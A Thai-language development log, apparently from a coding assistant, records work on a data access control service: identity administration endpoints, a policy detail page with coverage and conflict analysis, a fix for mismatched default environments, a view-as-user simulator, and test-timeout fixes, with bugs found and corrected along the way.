- ⚠️ **token ค้าง** — role ถูกอบเข้า JWT ตอน login (TTL 3600s) แต่ `/auth/me` อ่าน `app_role_assignment` สดทุกครั้ง → **console เห็นทันที แต่ authorization จริงเปลี่ยนตอน sign in รอบหน้า** เขียนประโยคนี้ไว้บนหัวตาราง ไม่ได้ซ่อน

#### W.5 ทดสอบกับของจริงบน 8080 — เจอบั๊กที่เทสต์ไม่เจอ

ยิงครบทั้งหกตัวด้วย token ของ `admin` จริง:

| เคส | ผล |
|---|---|
| สร้าง account + role เริ่มต้น | `201` |
| สร้างชื่อเดิมต่างตัวพิมพ์ | **`409`** (index ของ W.1 ทำงาน) |
| password สั้น | `400` *A password is between 10 and 200 characters* |
| `DATA_OWNER` + scope | `{"changed":true}` |
| `DATA_OWNER` ไม่มี scope | `400` *A data owner owns something specific: give the scope it applies to* |
| grant ซ้ำ | `{"changed":false}` — **ไม่ซ้ำแถว** |
| ถอด `PLATFORM_ADMIN` ของ admin คนสุดท้าย | **`409`** |
| disable admin คนสุดท้าย | **`409`** |
| ไม่มี token | `401` |

`audit_identity_change` เก็บครบ 10 แถวพร้อม `reason` และ `client_ip` = `::1`

🐛 **บั๊กที่เจอเพราะยิงของจริง:** server บังคับ display name แต่ `AccountForm.ready` ไม่ได้เช็ค → ปุ่ม **Create เปิดให้กดทั้งที่ตอบได้แค่ 400**
เทสต์ทั้ง 5 ตัวของหน้านี้ผ่านหมด เพราะไม่มีตัวไหนกด Create — *unit test ที่ mock API ทิ้งไม่มีทางเจอ validation ที่อยู่คนละฝั่ง* แก้แล้วทั้งสองฝั่ง (`ready` เช็ค `displayName.trim().length >= 2` และ hint เขียนว่า Required)

#### W.6 🗑️ เอา **Sources** ออกจากรางซ้าย (ผู้ใช้สั่ง)

> *"Source นี้ อยู่ใน Setting อยู่แล้ว ไม่ต้องแสดงที่ tab ซ้าย"*

ลบ entry ออกจาก `NAV_SECTIONS` เท่านั้น — **route `/sources` ยังอยู่** และยังเข้าถึงได้สามทาง: Settings → Data sources (การ์ด), เมนู **+ Create → Register a source**, และเมนู account
ถูกแล้วที่ไม่ลบ route: มันคือหน้า setup ไม่ใช่งานประจำวัน ซึ่งเป็นเหตุผลเดียวกับที่ไม่ควรอยู่บนรางระดับบนสุด (เขียนเป็น comment คาไว้ตรงที่ลบ กัน "เพิ่มกลับมาสิ" รอบหน้า)

#### W.7 🐛 "Membership of 1 group" กดไม่ได้ (ผู้ใช้ชี้)

> *"Membership of 1 group จากที่แสดงใน user / ทำไมกดไปดู group นั้นไม่ได้"*

แถว **group** ลิงก์ด้วยจำนวนสมาชิกมาตั้งแต่รอบ V แต่แถว **user** เป็น text เปล่า — ซึ่งเป็นสิ่งที่แย่ที่สุดที่ตัวเลขตัวหนึ่งจะบอกได้: *มี group อยู่ คนนี้อยู่ในนั้น แต่ไม่มีทางรู้ว่า group ไหน*

เหตุผลที่แก้ที่ฝั่ง API ไม่ใช่แค่ทำให้ตัวเลขเป็นลิงก์: list endpoint มีแต่ `groupCount` ไม่มี id ของ group เลยลิงก์ตรงไม่ได้ → เพิ่มคอลัมน์ลง `PRINCIPAL_COLUMNS`

```sql
COALESCE((SELECT json_agg(json_build_object('id', named.id, 'name', named.name))
          FROM (SELECT g.id, COALESCE(NULLIF(g.display_name,''), g.username) AS name
                  FROM group_member gn JOIN principal g ON g.id = gn.group_id
                 WHERE gn.member_id = p.id
                 ORDER BY 2 LIMIT 5) named)::text, '[]') AS groups,
```

- **`json` ไม่ใช่ string ที่คั่นด้วย comma** — display name มีอะไรอยู่ข้างในก็ได้ รวมถึงตัวคั่นที่ตอนนั้นดูปลอดภัย
- **`LIMIT 5`** — `groupCount` ตอบ "กี่ group" อยู่แล้ว ลิสต์นี้มีไว้ตอบ "group ไหน" ในเคสปกติ (1–2 group) คนที่อยู่ 50 group ไม่ควรทำให้ทุกแถวของ directory กลายเป็นกำแพง
- mapper แปลง JSON แบบ **ไม่โยน** — คอลัมน์เดียวอ่านไม่ออกไม่ควรทำให้ทั้ง directory หาย

UI: ผู้ใช้ ≤ 2 group → **ชิปชื่อ group กดเข้าไปได้ตรงๆ** · มากกว่านั้น → `N groups` เป็นลิงก์ไปหน้าตัวเอง (ซึ่งการ์ด *Member of* list ครบอยู่แล้ว) · group ยังลิงก์ด้วย `N members` เหมือนเดิม
ตรวจกับข้อมูลจริงในเครื่องแล้ว — `analyst_a` / `analyst_b` / `steward_c` คืน `[{"id":"51296ea9-…","name":"Finance"}]` ครบทั้งสามคน

#### เทสต์

- dac-service **69 เทสต์** *(ตัวเลขนี้นับผิด — วัดใหม่ 2026-09-22 ได้ **56**; ส่วนต่างคือ nested class ของ IT ที่รั่วเข้าเฟส unit ดู What Didn't Work)* (ใหม่ 7 — `IdentityAdminStoreTest` ที่สร้างบน `Jdbi` = `null` โดยตั้งใจ: **NullPointerException ในไฟล์นั้นแปลว่า input เดินทางไปถึง connection ก่อนที่จะมีใครตรวจ** ซึ่งคือ regression ที่ไฟล์นี้มีไว้จับ)
- `IdentityAdminStoreIT` **15 เทสต์** (Testcontainers, `-Pintegration verify` exit 0) — Creating 4 · Roles 3 · **LastAdministrator 4** · SyncedPrincipals 2 · Audit 2
- frontend **13 suites / 54 tests** — `AppRolesPage.test.tsx` **5 ตัว (ใหม่)** · `PrincipalsPage.test.tsx` **10 ตัว** (เพิ่ม 2: ชื่อ group ของคนต้องกดเข้าไปได้ · คนที่อยู่หลาย group ต้อง fallback เป็นตัวเลขที่ยังกดได้)

---

### X. หน้า Policy แยก "อ่าน" ออกจาก "แก้" + ตอบสองคำถามที่กลับด้านกัน (ปิด FR-3.1.5)

> ผู้ใช้สั่ง — *"ใน Policies ต้องกด Edit ถึงจะไปหน้าแก้ไขได้ ถ้าไม่ Edit แค่ให้เห็น Configure แบบ สรุป ออกแบบหน้าจอให้ดี ง่าย และดูได้ว่ามี Table Column ไหน Apply กับ Policy นั้นบ้าง มี Policy ไหน ที่ COnflict กับ policy นี้บ้าง / ใน ทางกลับกัน ก็ต้องดูได้ว่า Table นี้ มี Subscription Policy และ Data policy ไหน apply อยู่บ้าง"*

รอบนี้เป็นสองคำถามที่เป็นด้านกลับของกันและกัน และเดิมระบบตอบไม่ได้ทั้งคู่:

| ถามจากฝั่ง policy | ถามจากฝั่ง asset |
|---|---|
| policy นี้ลงไปที่ **table/column ไหนจริงๆ** | table นี้มี **policy อะไรคุมอยู่** |
| มี policy ไหน **ชนกับ**ตัวนี้ | แบ่งเป็น Subscription / Data |

**ความต่างที่เป็นหัวใจ:** `selector` คือ *คำกล่าวอ้าง* ส่วน `policy_binding` คือ *ผลจริง* — สองอย่างนี้ต่างกันทุกครั้งที่ estate ขยับหลัง resolve ครั้งล่าสุด และนั่นคือสิ่งที่คนกำลังจะกด Activate ต้องเห็น

#### X.1 Backend — `policy/PolicyOverview.java` (ใหม่, 492 บรรทัด)

คลาสเดียว ตอบสามคำถาม อ่าน `policy_binding` เป็นแหล่งความจริงทั้งหมด:

| method | ตอบว่า | endpoint |
|---|---|---|
| `coverage(policyId)` | policy นี้ลงที่ไหนบ้าง — `tableCount` / `columnCount` แยกกัน + `sample` + `truncated` + `resolvedAt` | `GET /v1/policies/{id}/bindings` |
| `overlaps(policyId, document, environment)` | policy อื่นที่ bind target เดียวกัน + **คำตัดสินว่าเจอกันแล้วเกิดอะไร** | `GET /v1/policies/{id}/conflicts` |
| `applied(fqn, activePolicies)` | table นี้โดน policy อะไร + **column ไหนของ table นี้ที่แต่ละตัวลงไปถึง** | `GET /v1/policies/for-asset/{fqn}` |

**`sample` ถูก cap ที่ 200 (`SAMPLE_LIMIT`) แต่ `tableCount` / `columnCount` นับจาก SQL ทั้งหมดไม่ cap** — เป็นกติกาเดียวกับที่ผู้ใช้สั่งไว้ตอนหน้า Query (*"ต้องทำให้เห็นครบสิ ในอนาคตอาจจะมี Row เยอะ"*): ตัวเลขต้องจริงเสมอ ตัดได้แค่รายการที่โชว์ และหน้าจอต้องบอกว่าตัดแล้ว

**`relate()` — คำตัดสินว่า overlap หนึ่งๆ แปลว่าอะไร** (เรียงตาม `RELATION_ORDER`, แรงสุดขึ้นก่อน):

| relation | เกิดเมื่อ | ความหมาย |
|---|---|---|
| `BLOCKED_BY` | ตัวเราเป็น SUBSCRIPTION ALLOW เจอ DENY | **ตัวนี้ตายบน target ที่ชนกัน** — deny ชนะเสมอ |
| `BLOCKS` | ตัวเราเป็น DENY เจอ ALLOW | ตัวโน้นตาย |
| `MASK_OVERLAP` | DATA ทั้งคู่ และตัวเราแตะ column | ลงคอลัมน์เดียวกัน = เข้มกว่าชนะ อีกตัวไม่มีผลที่มองเห็น |
| `NARROWS` | SUBSCRIPTION ALLOW ทั้งคู่ / DATA ที่เป็น row filter | **ต้องผ่านทุกชั้น** ไม่ใช่ผ่านตัวใดตัวหนึ่ง — เป็นข้อที่คนเข้าใจผิดบ่อยที่สุด |
| `COMPOSES` | คนละ type / DENY ทั้งคู่ | อยู่ด้วยกันได้ ไม่มีใครทับใคร |

`CANNOT_LOOSEN` มีอยู่ใน `RELATION_ORDER` และใน union ฝั่ง TS แต่ **`relate()` ไม่เคยคืนค่านี้** — เรื่อง "ใครมีสิทธิ์แก้" ถูกตอบด้วย `overrideNote` ต่างหาก (ดู X.4) จดไว้เป็นช่องว่างข้อ 7

#### X.2 แก้ `affecting` ที่ default ผิด environment — บั๊กเงียบที่อันตรายที่สุดของรอบนี้

`PolicyResource.affecting` default `environment` เป็น `"dev"` แต่ `DecisionService.DEFAULT_ENVIRONMENT` เป็น `"prod"` → **หน้าจอ "policy ที่มีผลกับ asset นี้" ตอบคนละ environment กับที่ engine ตัดสินจริง** และเพราะ policy ที่เขียนใหม่ส่วนใหญ่ถูกเก็บเป็น `dev` หน้าจอจะ *ดูเหมือนถูก* แล้วไปหลุดตอน enforce

แก้เป็น helper ตัวเดียวที่ทุก endpoint ใช้ร่วมกัน:

```java
private static String environmentOr(String environment) {
  return environment == null || environment.isBlank()
      ? DecisionService.DEFAULT_ENVIRONMENT
      : environment;
}
```

ฝั่ง TS `fetchPoliciesAffecting` / `fetchPoliciesForAsset` ก็ default เป็น `'prod'` ตามกัน → **ปิดช่องว่างข้อ 3**

> ⚠️ ที่ยังไม่ปิด: **หน้า builder ยัง default `environment: 'dev'` ตอนสร้าง policy** ในขณะที่ engine enforce `prod` → policy ที่เขียนด้วยค่า default ล้วนๆ จะไม่มีวันถูก enforce เลย จดเป็นช่องว่างข้อ 8

#### X.3 `/policies/:id` = อ่านอย่างเดียว · `/policies/:id/edit` = builder

`App.tsx` เพิ่มเส้นทางที่สอง — เดิม `/policies/:id` เปิด `PolicyBuilderPage` ตรงๆ ซึ่งแปลว่า **แค่กดดูก็อยู่ในโหมดแก้แล้ว**

`pages/policies/PolicyDetailPage.tsx` (ใหม่, 629 บรรทัด) เรียง 5 ส่วน:

| ส่วน | มีอะไร |
|---|---|
| **In plain words** | สรุป policy เป็นภาษาคนจาก readback ตัวเดิม |
| **Configuration** | scope / effect / environment / lifecycle / allowLocalOverride เป็นแถว label–value |
| **Coverage** | `N tables · M columns` + ต้นไม้ table → column จัดกลุ่มด้วย `groupByTable()` + เหตุผลที่ match ต่อ target + ปุ่ม **Re-resolve** |
| **Conflicts** | overlap ทุกตัว เรียงตามความแรง + ป้าย relation + คำอธิบายเต็มประโยค + `overrideNote` |
| **History** | version list เดิม |

ปุ่มบนหัว: **Edit** (`Edit03` → `/policies/:id/edit`) · lifecycle transition · Re-resolve
ไม่มี input ในหน้านี้เลยแม้แต่ช่องเดียว — เป็นหน้าอ่าน

#### X.4 `overrideNote` — เคยคำนวณและมีเทสต์ แต่ไม่เคยไปถึงหน้าจอ

`PolicyOverview.overrideNote(...)` มีมาตั้งแต่ต้น แต่ signature เดิมรับ `Overlap` ซึ่งทำให้ **เรียกจากใน `overlaps()` ไม่ได้ เพราะตรงนั้นกำลังสร้าง `Overlap` อยู่** → ค่าเลยไม่เคยถูกใส่ลง record และไม่เคยออก API

แก้เป็น `overrideNote(Policy subject, String otherScopeLevel, boolean otherAllowsLocalOverride)` แล้วเรียกตอนประกอบแถว, เพิ่ม field ท้าย record, เพิ่มใน TS interface, และ render เป็นบรรทัดสีเตือนพร้อมไอคอน `AlertTriangle` ใต้คำอธิบาย

**ทำไมต้องเป็นสองบรรทัด ไม่ใช่รวมเป็นอันเดียว** — `explanation` บอกว่า *engine ทำอะไรตรงที่สองตัวเจอกัน* ส่วน `overrideNote` บอกว่า *ใครมีสิทธิ์แก้* (FR-3.1.4) สองอย่างนี้ขัดกันได้: policy สองตัวอาจเห็นพ้องกันสนิทวันนี้ แต่ข้อหลังยังเป็นตัวตัดสินว่าพรุ่งนี้ใครแก้ตัวไหนได้ — เขียนเป็นคอมเมนต์ไว้ในไฟล์แล้ว

#### X.5 ด้านกลับ — panel **Policies** ในหน้า asset

`AssetDetailPage.tsx` เพิ่ม `<Policies fqn>` ที่แยกสองหัวข้อตามที่ model แยกไว้จริง:

- **Subscription — who may read it**
- **Data — what is visible once they are in**

ว่างทั้งคู่ = **ไม่ใช่ข้อความกลางๆ** แต่เป็นคำเตือนสีส้มว่า *"No active policy reaches this asset, so nothing grants access to it. Access is denied by default…"* เพราะ default คือ deny การปล่อยให้ว่างเฉยๆ จะอ่านเหมือน "ไม่มีข้อจำกัด" ซึ่งตรงข้ามกับความจริง

แต่ละแถวบอก scope level ที่มันมาจาก และ **data policy บอก column ที่มันลงไปถึงจริง** — เจ้าของ table อยากรู้ว่า `email` โดน mask ไม่ใช่ว่า "มี masking policy อยู่ที่ไหนสักแห่ง"

#### X.6 สามบั๊กที่ integration test จับได้ — ทั้งหมดอยู่ในโค้ดของรอบนี้เอง

รอบนี้เป็นตัวอย่างว่าทำไมต้องรัน IT จริงก่อนบอกว่าเสร็จ (ดู What Didn't Work ข้อใหม่ด้วย — ครั้งแรกที่รันมัน**ไม่ได้รันจริง**แต่รายงานว่าผ่าน):

| บั๊ก | อาการ | ทำไมไม่มีใครเห็น | ที่แก้ |
|---|---|---|---|
| **1. `/conflicts` 500 ทุก policy** | `UnableToCreateStatementException: Missing named parameter '3'` | JDBI อ่าน `[1:3]` ใน `(array_agg(...))[1:3]` เป็น **named parameter ชื่อ `3`** — โค้ดคอมไพล์ผ่าน หน้าจอขึ้นแค่ error message ทั่วไป | ตัด slice ออกจาก SQL ไป cap ใน Java ด้วย `EXAMPLE_LIMIT = 3`; `count(*)` ยังนับครบเหมือนเดิม |
| **2. column บอกว่าตัวเองเป็นพ่อของตัวเอง** | `parentFqn` ของ `...customer.email` = `...customer.email` | `policy_binding.asset_id` ถูกเขียนเฉพาะแถว TABLE → `COALESCE(a.fqn, b.target_fqn)` ตกมาที่ค่าของตัวเอง ต้นไม้ยังดูปกติเพราะ `groupByTable()` แค่จัดกลุ่มผิด | เพิ่ม `LEFT JOIN asset ca ON ca.id = c.asset_id` แล้ว `COALESCE(a.fqn, ca.fqn, b.target_fqn)` |
| **3. เทสต์ยืนยันลำดับที่ไม่มีความหมาย** | `bothKinds` ใช้ `containsExactly(sub, mask)` | ไม่ใช่บั๊กของโค้ด — `activeFor` เรียง scope layer → depth → **name** ทั้งคู่อยู่ ORG ที่เหลือจึงเป็นตัวอักษร | เปลี่ยนเป็น `containsExactlyInAnyOrder` + คอมเมนต์ว่าทำไมลำดับข้าม type ไม่ใช่ข้อเท็จจริงที่ควรผูก |

บั๊กข้อ 1 คือ **ฟีเจอร์ที่ผู้ใช้สั่งมาโดยตรง และมันพังหมดตั้งแต่บรรทัดแรก** ถ้าไม่รัน IT จะไปเจอตอนเปิดหน้าจอ

---

### Y. ปิดช่องว่างข้อ 7 และ 8 ที่เพิ่งจดไว้ในรอบเดียวกัน

สองข้อนี้เป็นเศษที่เหลือจากข้อ X — เล็กทั้งคู่ แต่ข้อที่สองเป็นบั๊กที่ผู้ใช้จะไม่มีวันเห็นด้วยตาตัวเอง

#### Y.1 ลบ `CANNOT_LOOSEN` ทิ้ง ไม่ใช่ทำให้มันทำงาน

ทางเลือกมีสองทาง: ให้ `relate()` คืนค่านี้จริง หรือลบทิ้ง — **เลือกลบ** เพราะมันผิดหมวดตั้งแต่ต้น

`relation` ทุกค่าตอบคำถามเดียวกันคือ *"engine ทำอะไรตรงที่ policy สองตัวเจอกัน"* ส่วน "ใครมีสิทธิ์แก้ตัวไหน" (FR-3.1.4) เป็นคนละแกน และถูกตอบด้วย `overrideNote` ไปแล้วในข้อ X.4 — สองอย่างนี้ขัดกันได้โดยที่ทั้งคู่ถูก การยัดคำตอบของแกนหนึ่งเข้าไปเป็นค่าหนึ่งของอีกแกนจะทำให้ policy ที่ compose กันสนิทแต่แก้ไม่ได้ ถูกจัดอันดับว่า "ชนกันแรงกว่า" ตัวที่ compose กันสนิทและแก้ได้ ซึ่งไม่จริง

ลบออกจากสามที่: `RELATION_ORDER` (Java), union `PolicyRelation` (TS), และตาราง `RELATION` ในหน้า Policy พร้อมเลื่อน `rank` ที่เหลือ · เขียนคอมเมนต์เหนือตารางไว้ว่าทำไมแกน "ใครแก้ได้" ไม่อยู่ในนี้

#### Y.2 builder default `environment` จาก `dev` → `prod`

**บั๊กเดิม:** policy ที่เขียนด้วยค่า default ล้วนๆ ถูกเก็บเป็น `dev` แต่ engine ตัดสินที่ `prod` → มัน **save ได้ activate ได้ โผล่ในทุก list และไม่เคยถูก enforce สักครั้ง** ไม่มี error ไม่มีหน้าจอว่าง ไม่มีอะไรผิดให้เห็น

**ทำไม default เป็น `prod` ถึงปลอดภัย:** สิ่งที่ทำให้ policy มีผลคือ lifecycle ไม่ใช่ field นี้ — `PolicyStore.create()` สร้างทุกตัวเป็น `DRAFT` เสมอ และต้องมีคนกด transition ไป `ACTIVE` การกดนั้นคือการตัดสินใจที่ตั้งใจ ส่วน field นี้ไม่ควรเป็นการตัดสินใจที่สองที่ไม่มีใครรู้ตัวว่ากำลังทำอยู่

แก้สามจุด:
- `api/policies.ts` เพิ่ม **`ENFORCED_ENVIRONMENT`** เป็นค่าคงที่ตัวเดียว (สะท้อน `DecisionService.DEFAULT_ENVIRONMENT`) แล้วให้ `fetchPoliciesForAsset` / `fetchPoliciesAffecting` / builder ใช้ร่วมกัน — บั๊กทั้งตระกูลนี้เกิดจาก literal `'dev'`/`'prod'` หลายก๊อปปี้ที่ drift จากกัน
- `EMPTY.environment` = `ENFORCED_ENVIRONMENT`
- ตัวเลือกในดรอปดาวน์มี hint ต่อค่า (`dev` / `uat` = *Authoring only — not enforced*, `prod` = *The environment the engine enforces*) **และ** มีคำเตือนใต้ field ที่ขึ้น**เฉพาะตอนเลือกค่าที่ engine ไม่อ่าน** — hint ที่อยู่ในดรอปดาวน์หายไปพร้อมดรอปดาวน์ ส่วนคำเตือนที่ขึ้นทุกครั้งคือคำเตือนที่ไม่มีใครอ่านตอนที่มันสำคัญ

#### Y.3 เทสต์

`PolicyBuilderPage.test.tsx` (ใหม่, 2 ตัว) — ค่า default ของ field นี้ต้องถูก **assert** ไม่ใช่ปล่อยให้เชื่อ เพราะค่าที่ผิดของมันไม่แสดงอาการอะไรเลย
- policy ใหม่เปิดมาที่ environment ที่ engine enforce
- เลือก `dev` แล้วต้องมีคำเตือน · ตอนอยู่ที่ `prod` ต้องไม่มี

---

### Z. View-as-user / Simulator (FR-5.2) — ปิดแล้ว

> แผนเขียนถึงฟีเจอร์นี้ว่า *"ฟีเจอร์นี้คือสิ่งที่ทำให้ทีม data กล้าใช้ระบบ ถ้าไม่มีจะไม่มีใครกล้า apply"*

#### Z.1 backend ไม่ต้องแตะเลย — สำรวจก่อนเขียน แล้วพบว่ามีครบอยู่แล้ว

ก่อนเริ่มได้ไล่ดู backend ทั้งเส้นทาง แล้วพบว่า **FR-5.2 ฝั่ง backend เสร็จไปแล้วตั้งแต่ M3**:

| ของที่มีอยู่แล้ว | ที่ไหน |
|---|---|
| `POST /api/v1/decisions` รับ `{principal, assetFqn, at, ip, purpose, environment}` | `DecisionResource.java` |
| gate การถามแทนคนอื่น: ต้องเป็น PLATFORM_ADMIN / POLICY_AUTHOR / DATA_OWNER / AUDITOR | `DecisionResource.decide()` |
| `POST /api/v1/query` + `asPrincipal` (รันจริงในฐานะคนอื่น ไม่ใช่ preview) | `QueryResource.java` |
| register ทั้งคู่ | `DacApplication.java:212-213` |

→ **รอบนี้เป็นงาน frontend ล้วน ไม่มี migration ไม่มี Maven build** · `DecisionService` เขียนคอมเมนต์ดักไว้ตั้งแต่ต้นแล้วว่า *"every runtime path — the simulator (FR-5.2), the query proxy (FR-6.3), the compilers — goes through it so that a decision shown in a preview is the same object that governs a query"* ซึ่งเป็นเหตุผลที่หน้านี้ **ไม่ได้จำลองอะไรเลย** มันแสดง decision ตัวจริง

#### Z.2 ไฟล์ที่เพิ่ม/แก้

- **`api/decisions.ts` (ใหม่)** — `simulate(ask)` บาง ๆ ทับ `POST /v1/decisions` · default `environment` เป็น `ENFORCED_ENVIRONMENT` ตัวเดียวกับที่ builder ใช้ (ผลพลอยได้จากข้อ Y.2 — ถ้ายังเป็น literal `'dev'` หน้านี้จะตอบคนละ policy set กับที่ engine บังคับใช้ โดยไม่มีอะไรบอก)
- **`pages/simulator/SimulatorPage.tsx` (ใหม่, ~560 บรรทัด)**
- **`App.tsx`** — route `/simulator`
- **`layout/navigation.ts`** — Simulator `milestone: 'M4'` → `null` (nav จองที่ไว้แล้ว เหลือแค่ปลดป้าย)
- **`pages/catalog/AssetDetailPage.tsx`** — ปุ่ม **View as someone** บน header → `/simulator?asset=<fqn>` · ใช้ `onPress` + `navigate()` ตามแบบที่หน้า Policy ใช้ **ไม่ใช่ `href`** (ซึ่งจะ reload ทั้งหน้า)
- **`shot-simulator.mjs`** — สคริปต์ถ่ายภาพหน้าจอ 3 คน (gitignore อยู่แล้ว)

#### Z.3 การตัดสินใจที่สำคัญ 4 ข้อ

**(ก) projection ไล่จาก column ของ catalog ไม่ใช่จาก mask list**
ถ้าไล่จาก `columnMasks` หน้าจอจะบอกได้แค่ "อะไรถูก mask" แต่ **สิ่งที่คนเปิดหน้านี้มาหาคือ column ที่ *ไม่* ถูก mask** — `citizen_id · as stored` คือบรรทัดที่ทำให้มีคนไปเขียน policy ส่วน mask list ไม่มีทางแสดงมันได้เลย · ใช้ `queryKey: ['catalog-asset', fqn]` **ตัวเดียวกับ AssetDetailPage** → เปิดต่อกันเสียคำขอเดียว

**(ข) แยก "matched" ออกจาก "decisive" และ **สลับข้างตามผลลัพธ์**
เวอร์ชันแรกใช้ `reason.matched` เป็นตัวตัดสินว่าอันไหนสำคัญ — **ผิด และเห็นชัดตอนถ่ายภาพหน้าจอ analyst_b จริง**: หน้าจอ deny แต่ขึ้น policy สีเขียว `allow` เป็นเหตุผลหลัก ส่วนสองประโยคที่ตอบคำถามจริง (`expression is false for this principal: user.country == asset.prop('dataResidency')` / `attribute condition not satisfied: clearance lt L2`) ถูกยุบอยู่ใต้สามเหลี่ยม

กติกาที่ถูกคือ **เหตุผลที่ "สำคัญ" คือเหตุผลที่เถียงไปทางผลลัพธ์** และมันกลับข้างกับผลลัพธ์:
- **allow** → decisive = `matched`
- **deny** → decisive = `!matched || effect === 'DENY'` เพราะ policy ที่ *ไม่* match คือสิ่งที่กันไว้ ส่วน policy ที่ match ไม่ได้ทำให้ถูก deny
- reason ที่ **ไม่มี `policyId`** (`(composition)`) ไม่ใช่ policy — มันคือประโยคของ engine เองว่าชั้นต่างๆ รวมกันแล้วได้อะไร → ขึ้นบนสุดของ deny เสมอ
- ป้าย effect ระบายสีตาม**สิ่งที่เกิดขึ้น** ไม่ใช่ตามที่ policy ประกาศ: ไม่ match = เทา + คำว่า *"would allow, did not match"* · สีเขียว `allow` ข้างประโยค "expression is false" คือการพูดความจริงที่ถูกอ่านเป็นตรงข้าม

**(ค) deny แล้วไม่แสดง projection เลย**
สิ่งที่ *จะ* ถูก mask ถ้าเข้าถึงได้ ไม่ใช่คำตอบฉบับย่อของ deny — มันเป็นคนละคำตอบ และการโชว์มันชวนให้สรุปผิด

**(ง) datalist ไม่ใช่ dropdown**
ทั้งรายชื่อคนและรายชื่อ table ยาวเท่าองค์กร · datalist พิมพ์กรองได้ **และยังรับชื่อที่ไม่อยู่ในลิสต์** ซึ่งสำคัญ เพราะ "principal ที่ระบบไม่รู้จัก" เป็นคำถามที่ถูกต้อง และคำตอบคือ denial ที่บอกเหตุผลนั้นตรงๆ

#### Z.4 field `at` / `ip` / `purpose` มีไว้ทำไม

policy ที่เปิดหน้าต่าง 08:00–18:00 และ policy ที่ผูกกับ IP range **ทดสอบไม่ได้เลย** ถ้าเวลาที่ถามได้มีแค่ "ตอนนี้" และ IP มีแค่ของตัวเอง · นี่คือสิ่งที่เปลี่ยน "เราคิดว่ามันน่าจะ deny นอกเวลา" ให้เป็นของที่ใครก็ตรวจได้ในไม่กี่วินาที · `at` ถูกแปลงเป็น ISO instant ก่อนส่ง และ URL ถูก sync (`?principal=&asset=`) เพื่อให้ **deny ที่มีคนไม่เห็นด้วย ส่งเป็นลิงก์ได้** ไม่ใช่ส่งเป็นคำอธิบายว่าให้กรอกช่องไหนบ้าง

#### Z.5 เทสต์ + ยืนยันกับของจริง

`SimulatorPage.test.tsx` (ใหม่, **10 ตัว**) — column ที่ไม่มี mask ต้องโผล่ · deny ต้องไม่โชว์ projection · **deny ต้องนำด้วยสิ่งที่กันไว้ ไม่ใช่สิ่งที่ match** (กันข้อ ข ไม่ให้กลับมา) · policy ที่ดูแล้วไม่เข้าเงื่อนไขต้องถูกยุบ · unenforceable ต้องพูดออกมา · ไม่กรอกครบต้องกดไม่ได้ · `describePredicate` 4 ตัว

**ยิงจริงกับ backend ที่รันอยู่** (`demo-pg.salesdb.sales.customer`) — ตรงกับ manual E2E ข้อ 9 ของแผนเป๊ะ:

| คน | ผลจาก engine | หน้าจอแสดง |
|---|---|---|
| `analyst_a` | allow · `citizen_id` PARTIAL(5) · `email` REGEX · rows `branch_code IN (BKK-01)` | 7 as stored · 2 masked · 0 hidden · *"Only rows where branch_code is BKK-01."* |
| `analyst_b` | deny (`user.country != dataResidency`, `clearance lt L2`) | ไม่มี projection · Why นำด้วยประโยค composition |
| `steward_c` | allow · ไม่มี mask · rows `IN (BKK-01, CNX-01)` | 9 as stored · 0 masked · *"is one of BKK-01, CNX-01."* |

> **กับดักที่เจอระหว่างทาง:** backend ที่รันค้างอยู่พ่น `ClassNotFoundException` ของคลาสที่อยู่ใน jar ตัวเอง — ไม่ใช่บั๊กโค้ด แต่เพราะ **`verify` เขียนทับ jar ใต้ JVM ที่เปิดไฟล์นั้นค้างไว้** classloader จึงโหลดคลาสที่ยังไม่เคยโหลดไม่ได้ → **restart backend ทุกครั้งหลัง build ก่อนจะยิงทดสอบ** ไม่งั้นจะไล่หาบั๊กที่ไม่มีอยู่จริง

#### Z.6 เทสต์ที่ล้มไม่ซ้ำชุดกัน — สองนาฬิกาที่ต้องตั้งทั้งคู่

รอบนี้ full suite **ล้มคนละชุดกันสามรอบติด** (6 → 4 → 2 suites) ทั้งที่โค้ดไม่ได้เปลี่ยนระหว่างรอบ · suite ที่ล้มคือ suite ที่ใช้เวลา 90–114 วินาที เสมอ

สาเหตุไม่ใช่โค้ด: `findBy*` **ตัวแรก**ของแต่ละ suite เป็นคนจ่ายค่า ts-jest type-check + compile ของ design system ทั้งกอง (ไม่ cache ข้าม worker) → พอเครื่องมีโหลด (JVM + Vite dev + jest 16 suites พร้อมกัน) งบหมดไปกับการคอมไพล์ก่อนที่ component จะได้ render อะไรเลย

**มีนาฬิกาสองตัว และต้องตั้งทั้งคู่ — ตั้งตัวเดียวแล้วอาการย้ายที่เฉยๆ:**

| นาฬิกา | default | ตั้งที่ | อาการตอนหมดเวลา |
|---|---|---|---|
| งบต่อเทสต์ของ jest | **5s** | `jest.config.cjs` → `testTimeout: 30000` | `Exceeded timeout of 5000 ms for a test` |
| งบของ `findBy*` เอง (คนละตัวกับข้างบน) | **1s** | `src/setupTests.ts` → `configure({ asyncUtilTimeout: 15000 })` | `Unable to find an element with the text: …` + dump DOM ที่ยัง render ไม่เสร็จ |

ตัวที่สองหลอกที่สุด เพราะข้อความมันอ่านเหมือน **assertion ผิด** ไม่ใช่ timeout — DOM ที่ dump ออกมาคือหน้าจอครึ่งเดียวที่ render ทันในหนึ่งวินาที ไม่ใช่หน้าจอสุดท้าย

> **timeout ที่ยิงตอนคอมไพล์ไม่ได้บอกอะไรเกี่ยวกับโค้ด** — รอนานขึ้นสำหรับ element ที่กำลังจะมา ไม่มีต้นทุน ส่วน element ที่ไม่มีวันมาก็ยังล้มอยู่ดี แค่ช้าลง

---

## รอบก่อนหน้า — Global search ข้ามทุก entity + transition ตอนเปลี่ยนหน้า/เข้า-ออกระบบ + ชิป governance ที่อ่านออก

> รอบนี้เพิ่ม **endpoint ใหม่หนึ่งตัว** (`GET /api/v1/search`) และงาน UX ล้วนๆ อีกสามเรื่องที่ผู้ใช้สั่งระหว่างทาง
> milestone ไม่ขยับ แต่ search เป็นของที่ M1 ค้างไว้ (ก่อนหน้านี้ช่องค้นหาบน header แค่พาไปหน้า Catalog พร้อม query string)

### A. Global search — ค้นได้ทุกชนิด ไม่ใช่แค่ asset

**โจทย์จากผู้ใช้:** *"search ข้างบน ให้ Search ได้ทั้งหมดอะ Term, tag, domain ,..."*

**Backend — `backend/dac-service/src/main/java/com/mfec/dac/catalog/SearchQuery.java` (ใหม่)**

`UNION ALL` เก้า branch ในคิวรีเดียว แล้ว rank รวมกันทั้งก้อน:

| branch | ตาราง | `kind` | `facet_type` ที่คืน |
|---|---|---|---|
| asset | `asset` (`is_current`) | `asset` | – |
| column | `asset_column` ⨝ `asset` | `column` | – |
